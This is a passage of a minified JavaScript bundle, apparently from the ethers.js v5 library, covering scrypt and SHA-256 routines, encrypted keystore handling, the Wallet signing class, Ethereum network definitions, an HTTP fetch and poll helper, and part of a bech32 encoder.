P=m,B=x,M=S,W=T,K=k,q=I,J=E,le=C,ae,U,G,Z,j;for(U=0;U<16;U++)G=D+U*4,N[U]=(O[G]&255)<<24|(O[G+1]&255)<<16|(O[G+2]&255)<<8|O[G+3]&255;for(U=16;U<64;U++)ae=N[U-2],Z=(ae>>>17|ae<<15)^(ae>>>19|ae<<13)^ae>>>10,ae=N[U-15],j=(ae>>>7|ae<<25)^(ae>>>18|ae<<14)^ae>>>3,N[U]=(Z+N[U-7]|0)+(j+N[U-16]|0)|0;for(U=0;U<64;U++)Z=(((K>>>6|K<<26)^(K>>>11|K<<21)^(K>>>25|K<<7))+(K&q^~K&J)|0)+(le+(w[U]+N[U]|0)|0)|0,j=((P>>>2|P<<30)^(P>>>13|P<<19)^(P>>>22|P<<10))+(P&B^P&M^B&M)|0,le=J,J=q,q=K,K=W+Z|0,W=M,M=B,B=P,P=Z+j|0;m=m+P|0,x=x+B|0,S=S+M|0,T=T+W|0,k=k+K|0,I=I+q|0,E=E+J|0,C=C+le|0,D+=64,R-=64}}L(g);let $,y=g.length%64,A=g.length/536870912|0,b=g.length<<3,v=y<56?56:120,_=g.slice(g.length-y,g.length);for(_.push(128),$=y+1;$<v;$++)_.push(0);return _.push(A>>>24&255),_.push(A>>>16&255),_.push(A>>>8&255),_.push(A>>>0&255),_.push(b>>>24&255),_.push(b>>>16&255),_.push(b>>>8&255),_.push(b>>>0&255),L(_),[m>>>24&255,m>>>16&255,m>>>8&255,m>>>0&255,x>>>24&255,x>>>16&255,x>>>8&255,x>>>0&255,S>>>24&255,S>>>16&255,S>>>8&255,S>>>0&255,T>>>24&255,T>>>16&255,T>>>8&255,T>>>0&255,k>>>24&255,k>>>16&255,k>>>8&255,k>>>0&255,I>>>24&255,I>>>16&255,I>>>8&255,I>>>0&255,E>>>24&255,E>>>16&255,E>>>8&255,E>>>0&255,C>>>24&255,C>>>16&255,C>>>8&255,C>>>0&255]}function s(g,w,m){g=g.length<=64?g:n(g);const x=64+w.length+4,S=new Array(x),T=new Array(64);let k,I=[];for(k=0;k<64;k++)S[k]=54;for(k=0;k<g.length;k++)S[k]^=g[k];for(k=0;k<w.length;k++)S[64+k]=w[k];for(k=x-4;k<x;k++)S[k]=0;for(k=0;k<64;k++)T[k]=92;for(k=0;k<g.length;k++)T[k]^=g[k];function E(){for(let C=x-1;C>=x-4;C--){if(S[C]++,S[C]<=255)return;S[C]=0}}for(;m>=32;)E(),I=I.concat(n(T.concat(n(S)))),m-=32;return m>0&&(E(),I=I.concat(n(T.concat(n(S))).slice(0,m))),I}function o(g,w,m,x,S){let T;for(u(g,(2*m-1)*16,S,0,16),T=0;T<2*m;T++)l(g,T*16,S,16),c(S,x),u(S,0,g,w+T*16,16);for(T=0;T<m;T++)u(g,w+T*2*16,g,T*16,16);for(T=0;T<m;T++)u(g,w+(T*2+1)*16,g,(T+m)*16,16)}function a(g,w){return g<<w|g>>>32-w}function c(g,w){u(g,0,w,0,16);for(let m=8;m>0;m-=2)w[4]^=a(w[0]+w[12],7),w[8]^=a(w[4]+w[0],9),w[12]^=a(w[8]+w[4],13),w[0]^=a(w[12]+w[8],18),w[9]^=a(w[5]+w[1],7),w[13]^=a(w[9]+w[5],9),w[1]^=a(w[13]+w[9],13),w[5]^=a(w[1]+w[13],18),w[14]^=a(w[10]+w[6],7),w[2]^=a(w[14]+w[10],9),w[6]^=a(w[2]+w[14],13),w[10]^=a(w[6]+w[2],18),w[3]^=a(w[15]+w[11],7),w[7]^=a(w[3]+w[15],9),w[11]^=a(w[7]+w[3],13),w[15]^=a(w[11]+w[7],18),w[1]^=a(w[0]+w[3],7),w[2]^=a(w[1]+w[0],9),w[3]^=a(w[2]+w[1],13),w[0]^=a(w[3]+w[2],18),w[6]^=a(w[5]+w[4],7),w[7]^=a(w[6]+w[5],9),w[4]^=a(w[7]+w[6],13),w[5]^=a(w[4]+w[7],18),w[11]^=a(w[10]+w[9],7),w[8]^=a(w[11]+w[10],9),w[9]^=a(w[8]+w[11],13),w[10]^=a(w[9]+w[8],18),w[12]^=a(w[15]+w[14],7),w[13]^=a(w[12]+w[15],9),w[14]^=a(w[13]+w[12],13),w[15]^=a(w[14]+w[13],18);for(let m=0;m<16;++m)g[m]+=w[m]}function l(g,w,m,x){for(let S=0;S<x;S++)m[S]^=g[w+S]}function u(g,w,m,x,S){for(;S--;)m[x++]=g[w++]}function d(g){if(!g||typeof g.length!="number")return!1;for(let w=0;w<g.length;w++){const m=g[w];if(typeof m!="number"||m%1||m<0||m>=256)return!1}return!0}function h(g,w){if(typeof g!="number"||g%1)throw new Error("invalid "+w);return g}function f(g,w,m,x,S,T,k){if(m=h(m,"N"),x=h(x,"r"),S=h(S,"p"),T=h(T,"dkLen"),m===0||(m&m-1)!==0)throw new Error("N must be power of 2");if(m>2147483647/128/x)throw new Error("N too large");if(x>2147483647/128/S)throw new Error("r too large");if(!d(g))throw new Error("password must be an array or buffer");if(g=Array.prototype.slice.call(g),!d(w))throw new Error("salt must be an array or buffer");w=Array.prototype.slice.call(w);let I=s(g,w,S*128*x);const E=new Uint32Array(S*32*x);for(let K=0;K<E.length;K++){const q=K*4;E[K]=(I[q+3]&255)<<24|(I[q+2]&255)<<16|(I[q+1]&255)<<8|(I[q+0]&255)<<0}const C=new Uint32Array(64*x),N=new Uint32Array(32*x*m),L=32*x,$=new Uint32Array(16),y=new Uint32Array(16),A=S*m*2;let b=0,v=null,_=!1,O=0,D=0,R,P;const B=k?parseInt(1e3/x):4294967295,M=typeof setImmediate<"u"?setImmediate:setTimeout,W=function(){if(_)return k(new Error("cancelled"),b/A);let K;switch(O){case 0:P=D*32*x,u(E,P,C,0,L),O=1,R=0;case 1:K=m-R,K>B&&(K=B);for(let J=0;J<K;J++)u(C,0,N,(R+J)*L,L),o(C,L,x,$,y);if(R+=K,b+=K,k){const J=parseInt(1e3*b/A);if(J!==v){if(_=k(null,b/A),_)break;v=J}}if(R<m)break;R=0,O=2;case 2:K=m-R,K>B&&(K=B);for(let J=0;J<K;J++){const le=(2*x-1)*16,ae=C[le]&m-1;l(N,ae*L,C,L),o(C,L,x,$,y)}if(R+=K,b+=K,k){const J=parseInt(1e3*b/A);if(J!==v){if(_=k(null,b/A),_)break;v=J}}if(R<m)break;if(u(C,0,E,P,L),D++,D<S){O=0;break}I=[];for(let J=0;J<E.length;J++)I.push(E[J]>>0&255),I.push(E[J]>>8&255),I.push(E[J]>>16&255),I.push(E[J]>>24&255);const q=s(g,I,T);return k&&k(null,1,q),q}k&&M(W)};if(!k)for(;;){const K=W();if(K!=null)return K}W()}const p={scrypt:function(g,w,m,x,S,T,k){return new Promise(function(I,E){let C=0;k&&k(0),f(g,w,m,x,S,T,function(N,L,$){if(N)E(N);else if($)k&&C!==1&&k(1),I(new Uint8Array($));else if(k&&L!==C)return C=L,k(L)})})},syncScrypt:function(g,w,m,x,S,T){return new Uint8Array(f(g,w,m,x,S,T))}};r.exports=p})()}(r_)),r_.exports}var Wue=zue();const I$=Ss(Wue);var Hue=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const JT=new be(rY);function MM(r){return r!=null&&r.mnemonic&&r.mnemonic.phrase}class Vue extends xp{isKeystoreAccount(e){return!!(e&&e._isKeystoreAccount)}}function Kue(r,e,t){if(Gn(r,"crypto/cipher")==="aes-128-ctr"){const n=P1(Gn(r,"crypto/cipherparams/iv")),s=new pd.Counter(n),o=new pd.ModeOfOperation.ctr(e,s);return ze(o.decrypt(t))}return null}function iY(r,e){const t=P1(Gn(r,"crypto/ciphertext"));if(Qe(Ui(cn([e.slice(16,32),t]))).substring(2)!==Gn(r,"crypto/mac").toLowerCase())throw new Error("invalid password");const n=Kue(r,e.slice(0,16),t);n||JT.throwError("unsupported cipher",be.errors.UNSUPPORTED_OPERATION,{operation:"decrypt"});const s=e.slice(32,64),o=Ff(n);if(r.address){let c=r.address.toLowerCase();if(c.substring(0,2)!=="0x"&&(c="0x"+c),Oi(c)!==o)throw new Error("address mismatch")}const a={_isKeystoreAccount:!0,address:o,privateKey:Qe(n)};if(Gn(r,"x-ethers/version")==="0.1"){const c=P1(Gn(r,"x-ethers/mnemonicCiphertext")),l=P1(Gn(r,"x-ethers/mnemonicCounter")),u=new pd.Counter(l),d=new pd.ModeOfOperation.ctr(s,u),h=Gn(r,"x-ethers/path")||mw,f=Gn(r,"x-ethers/locale")||"en",p=ze(d.decrypt(c));try{const g=Ux(p,f),w=nc.fromMnemonic(g,null,f).derivePath(h);if(w.privateKey!=a.privateKey)throw new Error("mnemonic mismatch");a.mnemonic=w.mnemonic}catch(g){if(g.code!==be.errors.INVALID_ARGUMENT||g.argument!=="wordlist")throw g}}return new Vue(a)}function nY(r,e,t,i,n){return ze(E$(r,e,t,i,n))}function Gue(r,e,t,i,n){return Promise.resolve(nY(r,e,t,i,n))}function sY(r,e,t,i,n){const s=S$(e),o=Gn(r,"crypto/kdf");if(o&&typeof o=="string"){const a=function(c,l){return JT.throwArgumentError("invalid key-derivation function parameters",c,l)};if(o.toLowerCase()==="scrypt"){const c=P1(Gn(r,"crypto/kdfparams/salt")),l=parseInt(Gn(r,"crypto/kdfparams/n")),u=parseInt(Gn(r,"crypto/kdfparams/r")),d=parseInt(Gn(r,"crypto/kdfparams/p"));(!l||!u||!d)&&a("kdf",o),(l&l-1)!==0&&a("N",l);const h=parseInt(Gn(r,"crypto/kdfparams/dklen"));return h!==32&&a("dklen",h),i(s,c,l,u,d,64,n)}else if(o.toLowerCase()==="pbkdf2"){const c=P1(Gn(r,"crypto/kdfparams/salt"));let l=null;const u=Gn(r,"crypto/kdfparams/prf");u==="hmac-sha256"?l="sha256":u==="hmac-sha512"?l="sha512":a("prf",u);const d=parseInt(Gn(r,"crypto/kdfparams/c")),h=parseInt(Gn(r,"crypto/kdfparams/dklen"));return h!==32&&a("dklen",h),t(s,c,d,h,l)}}return JT.throwArgumentError("unsupported key-derivation function","kdf",o)}function oY(r,e){const t=JSON.parse(r),i=sY(t,e,nY,I$.syncScrypt);return iY(t,i)}function aY(r,e,t){return Hue(this,void 0,void 0,function*(){const i=JSON.parse(r),n=yield sY(i,e,Gue,I$.scrypt,t);return iY(i,n)})}function cY(r,e,t,i){try{if(Oi(r.address)!==Ff(r.privateKey))throw new Error("address/privateKey mismatch");if(MM(r)){const w=r.mnemonic;if(nc.fromMnemonic(w.phrase,null,w.locale).derivePath(w.path||mw).privateKey!=r.privateKey)throw new Error("mnemonic mismatch")}}catch(w){return Promise.reject(w)}typeof t=="function"&&!i&&(i=t,t={}),t||(t={});const n=ze(r.privateKey),s=S$(e);let o=null,a=null,c=null;if(MM(r)){const w=r.mnemonic;o=ze(Lx(w.phrase,w.locale||"en")),a=w.path||mw,c=w.locale||"en"}let l=t.client;l||(l="ethers.js");let u=null;t.salt?u=ze(t.salt):u=Wm(32);let d=null;if(t.iv){if(d=ze(t.iv),d.length!==16)throw new Error("invalid iv")}else d=Wm(16);let h=null;if(t.uuid){if(h=ze(t.uuid),h.length!==16)throw new Error("invalid uuid")}else h=Wm(16);let f=1<<17,p=8,g=1;return t.scrypt&&(t.scrypt.N&&(f=t.scrypt.N),t.scrypt.r&&(p=t.scrypt.r),t.scrypt.p&&(g=t.scrypt.p)),I$.scrypt(s,u,f,p,g,64,i).then(w=>{w=ze(w);const m=w.slice(0,16),x=w.slice(16,32),S=w.slice(32,64),T=new pd.Counter(d),k=new pd.ModeOfOperation.ctr(m,T),I=ze(k.encrypt(n)),E=Ui(cn([x,I])),C={address:r.address.substring(2).toLowerCase(),id:Uue(h),version:3,crypto:{cipher:"aes-128-ctr",cipherparams:{iv:Qe(d).substring(2)},ciphertext:Qe(I).substring(2),kdf:"scrypt",kdfparams:{salt:Qe(u).substring(2),n:f,dklen:32,p:g,r:p},mac:E.substring(2)}};if(o){const N=Wm(16),L=new pd.Counter(N),$=new pd.ModeOfOperation.ctr(S,L),y=ze($.encrypt(o)),A=new Date,b=A.getUTCFullYear()+"-"+tb(A.getUTCMonth()+1,2)+"-"+tb(A.getUTCDate(),2)+"T"+tb(A.getUTCHours(),2)+"-"+tb(A.getUTCMinutes(),2)+"-"+tb(A.getUTCSeconds(),2)+".0Z";C["x-ethers"]={client:l,gethFilename:"UTC--"+b+"--"+C.address,mnemonicCounter:Qe(N).substring(2),mnemonicCiphertext:Qe(y).substring(2),path:a,locale:c,version:"0.1"}}return JSON.stringify(C)})}function lY(r,e,t){if(jx(r)){t&&t(0);const i=A$(r,e);return t&&t(1),Promise.resolve(i)}return Fx(r)?aY(r,e,t):Promise.reject(new Error("invalid JSON wallet"))}function uY(r,e){if(jx(r))return A$(r,e);if(Fx(r))return oY(r,e);throw new Error("invalid JSON wallet")}const Zue=Object.freeze(Object.defineProperty({__proto__:null,decryptCrowdsale:A$,decryptJsonWallet:lY,decryptJsonWalletSync:uY,decryptKeystore:aY,decryptKeystoreSync:oY,encryptKeystore:cY,getJsonWalletAddress:que,isCrowdsaleWallet:jx,isKeystoreWallet:Fx},Symbol.toStringTag,{value:"Module"})),Yue="wallet/5.8.0";var DM=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const B2=new be(Yue);function Jue(r){return r!=null&&Jr(r.privateKey,32)&&r.address!=null}function Que(r){const e=r.mnemonic;return e&&e.phrase}class o1 extends b3{constructor(e,t){if(super(),Jue(e)){const i=new N1(e.privateKey);if(Pe(this,"_signingKey",()=>i),Pe(this,"address",Ff(this.publicKey)),this.address!==Oi(e.address)&&B2.throwArgumentError("privateKey/address mismatch","privateKey","[REDACTED]"),Que(e)){const n=e.mnemonic;Pe(this,"_mnemonic",()=>({phrase:n.phrase,path:n.path||mw,locale:n.locale||"en"}));const s=this.mnemonic,o=nc.fromMnemonic(s.phrase,null,s.locale).derivePath(s.path);Ff(o.privateKey)!==this.address&&B2.throwArgumentError("mnemonic/address mismatch","privateKey","[REDACTED]")}else Pe(this,"_mnemonic",()=>null)}else{if(N1.isSigningKey(e))e.curve!=="secp256k1"&&B2.throwArgumentError("unsupported curve; must be secp256k1","privateKey","[REDACTED]"),Pe(this,"_signingKey",()=>e);else{typeof e=="string"&&e.match(/^[0-9a-f]*$/i)&&e.length===64&&(e="0x"+e);const i=new N1(e);Pe(this,"_signingKey",()=>i)}Pe(this,"_mnemonic",()=>null),Pe(this,"address",Ff(this.publicKey))}t&&!Zy.isProvider(t)&&B2.throwArgumentError("invalid provider","provider",t),Pe(this,"provider",t||null)}get mnemonic(){return this._mnemonic()}get privateKey(){return this._signingKey().privateKey}get publicKey(){return this._signingKey().publicKey}getAddress(){return Promise.resolve(this.address)}connect(e){return new o1(this,e)}signTransaction(e){return Un(e).then(t=>{t.from!=null&&(Oi(t.from)!==this.address&&B2.throwArgumentError("transaction from address mismatch","transaction.from",e.from),delete t.from);const i=this._signingKey().signDigest(Ui(ZT(t)));return ZT(t,i)})}signMessage(e){return DM(this,void 0,void 0,function*(){return qT(this._signingKey().signDigest(g$(e)))})}_signTypedData(e,t,i){return DM(this,void 0,void 0,function*(){const n=yield no.resolveNames(e,t,i,s=>(this.provider==null&&B2.throwError("cannot resolve ENS names without a provider",be.errors.UNSUPPORTED_OPERATION,{operation:"resolveName",value:s}),this.provider.resolveName(s)));return qT(this._signingKey().signDigest(no.hash(n.domain,t,n.value)))})}encrypt(e,t,i){if(typeof t=="function"&&!i&&(i=t,t={}),i&&typeof i!="function")throw new Error("invalid callback");return t||(t={}),cY(this,e,t,i)}static createRandom(e){let t=Wm(16);e||(e={}),e.extraEntropy&&(t=ze(Nn(Ui(cn([t,e.extraEntropy])),0,16)));const i=Ux(t,e.locale);return o1.fromMnemonic(i,e.path,e.locale)}static fromEncryptedJson(e,t,i){return lY(e,t,i).then(n=>new o1(n))}static fromEncryptedJsonSync(e,t){return new o1(uY(e,t))}static fromMnemonic(e,t,i){return t||(t=mw),new o1(nc.fromMnemonic(e,null,i).derivePath(t))}}function dY(r,e){return Jy(g$(r),e)}function QT(r,e,t,i){return Jy(no.hash(r,e,t),i)}const Xue=Object.freeze(Object.defineProperty({__proto__:null,Wallet:o1,verifyMessage:dY,verifyTypedData:QT},Symbol.toStringTag,{value:"Module"})),ede="networks/5.8.0",LM=new be(ede);function tde(r){return r&&typeof r.renetwork=="function"}function ru(r){const e=function(t,i){i==null&&(i={});const n=[];if(t.InfuraProvider&&i.infura!=="-")try{n.push(new t.InfuraProvider(r,i.infura))}catch{}if(t.EtherscanProvider&&i.etherscan!=="-")try{n.push(new t.EtherscanProvider(r,i.etherscan))}catch{}if(t.AlchemyProvider&&i.alchemy!=="-")try{n.push(new t.AlchemyProvider(r,i.alchemy))}catch{}if(t.PocketProvider&&i.pocket!=="-"){const s=["goerli","ropsten","rinkeby","sepolia"];try{const o=new t.PocketProvider(r,i.pocket);o.network&&s.indexOf(o.network.name)===-1&&n.push(o)}catch{}}if(t.CloudflareProvider&&i.cloudflare!=="-")try{n.push(new t.CloudflareProvider(r))}catch{}if(t.AnkrProvider&&i.ankr!=="-")try{const s=["ropsten"],o=new t.AnkrProvider(r,i.ankr);o.network&&s.indexOf(o.network.name)===-1&&n.push(o)}catch{}if(t.QuickNodeProvider&&i.quicknode!=="-")try{n.push(new t.QuickNodeProvider(r,i.quicknode))}catch{}if(n.length===0)return null;if(t.FallbackProvider){let s=1;return i.quorum!=null?s=i.quorum:r==="homestead"&&(s=2),new t.FallbackProvider(n,s)}return n[0]};return e.renetwork=function(t){return ru(t)},e}function F9(r,e){const t=function(i,n){return i.JsonRpcProvider?new i.JsonRpcProvider(r,e):null};return t.renetwork=function(i){return F9(r,i)},t}const UM={chainId:1,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"homestead",_defaultProvider:ru("homestead")},jM={chainId:3,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"ropsten",_defaultProvider:ru("ropsten")},FM={chainId:63,name:"classicMordor",_defaultProvider:F9("https://www.ethercluster.com/mordor","classicMordor")},I6={unspecified:{chainId:0,name:"unspecified"},homestead:UM,mainnet:UM,morden:{chainId:2,name:"morden"},ropsten:jM,testnet:jM,rinkeby:{chainId:4,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"rinkeby",_defaultProvider:ru("rinkeby")},kovan:{chainId:42,name:"kovan",_defaultProvider:ru("kovan")},goerli:{chainId:5,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"goerli",_defaultProvider:ru("goerli")},kintsugi:{chainId:1337702,name:"kintsugi"},sepolia:{chainId:11155111,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"sepolia",_defaultProvider:ru("sepolia")},holesky:{chainId:17e3,name:"holesky",_defaultProvider:ru("holesky")},classic:{chainId:61,name:"classic",_defaultProvider:F9("https://www.ethercluster.com/etc","classic")},classicMorden:{chainId:62,name:"classicMorden"},classicMordor:FM,classicTestnet:FM,classicKotti:{chainId:6,name:"classicKotti",_defaultProvider:F9("https://www.ethercluster.com/kotti","classicKotti")},xdai:{chainId:100,name:"xdai"},matic:{chainId:137,name:"matic",_defaultProvider:ru("matic")},maticmum:{chainId:80001,name:"maticmum",_defaultProvider:ru("maticmum")},optimism:{chainId:10,name:"optimism",_defaultProvider:ru("optimism")},"optimism-kovan":{chainId:69,name:"optimism-kovan"},"optimism-goerli":{chainId:420,name:"optimism-goerli"},"optimism-sepolia":{chainId:11155420,name:"optimism-sepolia"},arbitrum:{chainId:42161,name:"arbitrum"},"arbitrum-rinkeby":{chainId:421611,name:"arbitrum-rinkeby"},"arbitrum-goerli":{chainId:421613,name:"arbitrum-goerli"},"arbitrum-sepolia":{chainId:421614,name:"arbitrum-sepolia"},bnb:{chainId:56,name:"bnb"},bnbt:{chainId:97,name:"bnbt"}};function rde(r){if(r==null)return null;if(typeof r=="number"){for(const i in I6){const n=I6[i];if(n.chainId===r)return{name:n.name,chainId:n.chainId,ensAddress:n.ensAddress||null,_defaultProvider:n._defaultProvider||null}}return{chainId:r,name:"unknown"}}if(typeof r=="string"){const i=I6[r];return i==null?null:{name:i.name,chainId:i.chainId,ensAddress:i.ensAddress,_defaultProvider:i._defaultProvider||null}}const e=I6[r.name];if(!e)return typeof r.chainId!="number"&&LM.throwArgumentError("invalid network chainId","network",r),r;r.chainId!==0&&r.chainId!==e.chainId&&LM.throwArgumentError("network chainId mismatch","network",r);let t=r._defaultProvider||null;return t==null&&e._defaultProvider&&(tde(e._defaultProvider)?t=e._defaultProvider.renetwork(r):t=e._defaultProvider),{name:r.name,chainId:e.chainId,ensAddress:r.ensAddress||e.ensAddress||null,_defaultProvider:t}}const ide="web/5.8.0";var nde=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};function sde(r,e){return nde(this,void 0,void 0,function*(){e==null&&(e={});const t={method:e.method||"GET",headers:e.headers||{},body:e.body||void 0};if(e.skipFetchSetup!==!0&&(t.mode="cors",t.cache="no-cache",t.credentials="same-origin",t.redirect="follow",t.referrer="client"),e.fetchOptions!=null){const o=e.fetchOptions;o.mode&&(t.mode=o.mode),o.cache&&(t.cache=o.cache),o.credentials&&(t.credentials=o.credentials),o.redirect&&(t.redirect=o.redirect),o.referrer&&(t.referrer=o.referrer)}const i=yield fetch(r,t),n=yield i.arrayBuffer(),s={};return i.headers.forEach?i.headers.forEach((o,a)=>{s[a.toLowerCase()]=o}):i.headers.keys().forEach(o=>{s[o.toLowerCase()]=i.headers.get(o)}),{headers:s,statusCode:i.status,statusMessage:i.statusText,body:ze(new Uint8Array(n))}})}var ode=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const Yl=new be(ide);function qM(r){return new Promise(e=>{setTimeout(e,r)})}function H0(r,e){if(r==null)return null;if(typeof r=="string")return r;if(Vy(r)){if(e&&(e.split("/")[0]==="text"||e.split(";")[0].trim()==="application/json"))try{return Cp(r)}catch{}return Qe(r)}return r}function ade(r){return Fn(r.replace(/%([0-9a-f][0-9a-f])/gi,(e,t)=>String.fromCharCode(parseInt(t,16))))}function hY(r,e,t){const i=typeof r=="object"&&r.throttleLimit!=null?r.throttleLimit:12;Yl.assertArgument(i>0&&i%1===0,"invalid connection throttle limit","connection.throttleLimit",i);const n=typeof r=="object"?r.throttleCallback:null,s=typeof r=="object"&&typeof r.throttleSlotInterval=="number"?r.throttleSlotInterval:100;Yl.assertArgument(s>0&&s%1===0,"invalid connection throttle slot interval","connection.throttleSlotInterval",s);const o=typeof r=="object"?!!r.errorPassThrough:!1,a={};let c=null;const l={method:"GET"};let u=!1,d=120*1e3;if(typeof r=="string")c=r;else if(typeof r=="object"){if((r==null||r.url==null)&&Yl.throwArgumentError("missing URL","connection.url",r),c=r.url,typeof r.timeout=="number"&&r.timeout>0&&(d=r.timeout),r.headers)for(const m in r.headers)a[m.toLowerCase()]={key:m,value:String(r.headers[m])},["if-none-match","if-modified-since"].indexOf(m.toLowerCase())>=0&&(u=!0);if(l.allowGzip=!!r.allowGzip,r.user!=null&&r.password!=null){c.substring(0,6)!=="https:"&&r.allowInsecureAuthentication!==!0&&Yl.throwError("basic authentication requires a secure https url",be.errors.INVALID_ARGUMENT,{argument:"url",url:c,user:r.user,password:"[REDACTED]"});const m=r.user+":"+r.password;a.authorization={key:"Authorization",value:"Basic "+p$(Fn(m))}}r.skipFetchSetup!=null&&(l.skipFetchSetup=!!r.skipFetchSetup),r.fetchOptions!=null&&(l.fetchOptions=ds(r.fetchOptions))}const h=new RegExp("^data:([^;:]*)?(;base64)?,(.*)$","i"),f=c?c.match(h):null;if(f)try{const m={statusCode:200,statusMessage:"OK",headers:{"content-type":f[1]||"text/plain"},body:f[2]?f$(f[3]):ade(f[3])};let x=m.body;return t&&(x=t(m.body,m)),Promise.resolve(x)}catch(m){Yl.throwError("processing response error",be.errors.SERVER_ERROR,{body:H0(f[1],f[2]),error:m,requestBody:null,requestMethod:"GET",url:c})}e&&(l.method="POST",l.body=e,a["content-type"]==null&&(a["content-type"]={key:"Content-Type",value:"application/octet-stream"}),a["content-length"]==null&&(a["content-length"]={key:"Content-Length",value:String(e.length)}));const p={};Object.keys(a).forEach(m=>{const x=a[m];p[x.key]=x.value}),l.headers=p;const g=function(){let m=null;return{promise:new Promise(function(T,k){d&&(m=setTimeout(()=>{m!=null&&(m=null,k(Yl.makeError("timeout",be.errors.TIMEOUT,{requestBody:H0(l.body,p["content-type"]),requestMethod:l.method,timeout:d,url:c})))},d))}),cancel:function(){m!=null&&(clearTimeout(m),m=null)}}}(),w=function(){return ode(this,void 0,void 0,function*(){for(let m=0;m<i;m++){let x=null;try{if(x=yield sde(c,l),m<i){if(x.statusCode===301||x.statusCode===302){const T=x.headers.location||"";if(l.method==="GET"&&T.match(/^https:/)){c=x.headers.location;continue}}else if(x.statusCode===429){let T=!0;if(n&&(T=yield n(m,c)),T){let k=0;const I=x.headers["retry-after"];typeof I=="string"&&I.match(/^[1-9][0-9]*$/)?k=parseInt(I)*1e3:k=s*parseInt(String(Math.random()*Math.pow(2,m))),yield qM(k);continue}}}}catch(T){x=T.response,x==null&&(g.cancel(),Yl.throwError("missing response",be.errors.SERVER_ERROR,{requestBody:H0(l.body,p["content-type"]),requestMethod:l.method,serverError:T,url:c}))}let S=x.body;if(u&&x.statusCode===304?S=null:!o&&(x.statusCode<200||x.statusCode>=300)&&(g.cancel(),Yl.throwError("bad response",be.errors.SERVER_ERROR,{status:x.statusCode,headers:x.headers,body:H0(S,x.headers?x.headers["content-type"]:null),requestBody:H0(l.body,p["content-type"]),requestMethod:l.method,url:c})),t)try{const T=yield t(S,x);return g.cancel(),T}catch(T){if(T.throttleRetry&&m<i){let k=!0;if(n&&(k=yield n(m,c)),k){const I=s*parseInt(String(Math.random()*Math.pow(2,m)));yield qM(I);continue}}g.cancel(),Yl.throwError("processing response error",be.errors.SERVER_ERROR,{body:H0(S,x.headers?x.headers["content-type"]:null),error:T,requestBody:H0(l.body,p["content-type"]),requestMethod:l.method,url:c})}return g.cancel(),S}return Yl.throwError("failed response",be.errors.SERVER_ERROR,{requestBody:H0(l.body,p["content-type"]),requestMethod:l.method,url:c})})}();return Promise.race([g.promise,w])}function qx(r,e,t){let i=(s,o)=>{let a=null;if(s!=null)try{a=JSON.parse(Cp(s))}catch(c){Yl.throwError("invalid JSON",be.errors.SERVER_ERROR,{body:s,error:c})}return t&&(a=t(a,o)),a},n=null;if(e!=null){n=Fn(e);const s=typeof r=="string"?{url:r}:ds(r);s.headers?Object.keys(s.headers).filter(a=>a.toLowerCase()==="content-type").length!==0||(s.headers=ds(s.headers),s.headers["content-type"]="application/json"):s.headers={"content-type":"application/json"},r=s}return hY(r,n,i)}function Hm(r,e){return e||(e={}),e=ds(e),e.floor==null&&(e.floor=0),e.ceiling==null&&(e.ceiling=1e4),e.interval==null&&(e.interval=250),new Promise(function(t,i){let n=null,s=!1;const o=()=>s?!1:(s=!0,n&&clearTimeout(n),!0);e.timeout&&(n=setTimeout(()=>{o()&&i(new Error("timeout"))},e.timeout));const a=e.retryLimit;let c=0;function l(){return r().then(function(u){if(u!==void 0)o()&&t(u);else if(e.oncePoll)e.oncePoll.once("poll",l);else if(e.onceBlock)e.onceBlock.once("block",l);else if(!s){if(c++,c>a){o()&&i(new Error("retry limit reached"));return}let d=e.interval*parseInt(String(Math.random()*Math.pow(2,c)));d<e.floor&&(d=e.floor),d>e.ceiling&&(d=e.ceiling),setTimeout(l,d)}return null},function(u){o()&&i(u)})}l()})}const cde=Object.freeze(Object.defineProperty({__proto__:null,_fetchData:hY,fetchJson:qx,poll:Hm},Symbol.toStringTag,{value:"Module"}));var i_,zM;function lde(){if(zM)return i_;zM=1;for(var r="qpzry9x8gf2tvdw0s3jn54khce6mua7l",e={},t=0;t<r.length;t++){var i=r.charAt(t);if(e[i]!==void 0)throw new TypeError(i+" is ambiguous");e[i]=t}function n(g){var w=g>>25;return(g&33554431)<<5^-(w>>0&1)&996825010^-(w>>1&1)&642813549^-(w>>2&1)&513874426^-(w>>3&1)&1027748829^-(w>>4&1)&705979059}function s(g){for(var w=1,m=0;m<g.length;++m){var x=g.charCodeAt(m);if(x<33||x>126)return"Invalid prefix ("+g+")";w=n(w)^x>>5}for(w=n(w),m=0;m<g.length;++m){var S=g.charCodeAt(m);w=n(w)^S&31}return w}function o(g,w,m){if(m=m||90,g.length+7+w.length>m)throw new TypeError("Exceeds length limit");g=g.toLowerCase();var x=s(g);if(typeof x=="string")throw new Error(x);for(var S=g+"1",T=0;T<w.length;++T){var k=w[T];if(k>>5!==0)throw new Error("Non 5-bit word");x=n(x)^k,S+=r.charAt(k)}for(T=0;T<6;++T)x=n(x);for(x^=1,T=0;T<6;++T){var 